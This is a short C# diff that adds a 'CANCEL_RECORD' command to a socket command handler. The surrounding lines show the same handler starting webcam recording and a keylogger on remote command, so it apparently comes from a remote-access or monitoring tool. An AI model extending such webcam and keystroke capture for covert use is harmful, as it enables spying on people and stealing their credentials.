@@ -326,6 +326,10 @@ public static void BroadcastLog(string message)
                             string result = WebcamManager.StartRecording(seconds);
                             SendJson(socket, "LOG", result);
                             break;
+                        case "CANCEL_RECORD":
+                            WebcamManager.CancelRecording();
+                            SendJson(socket, "LOG", "Đã hủy ghi hình.");
+                            break;
 
                         case "START_KEYLOG":
                             if (!KeyLoggerService.IsRunning)
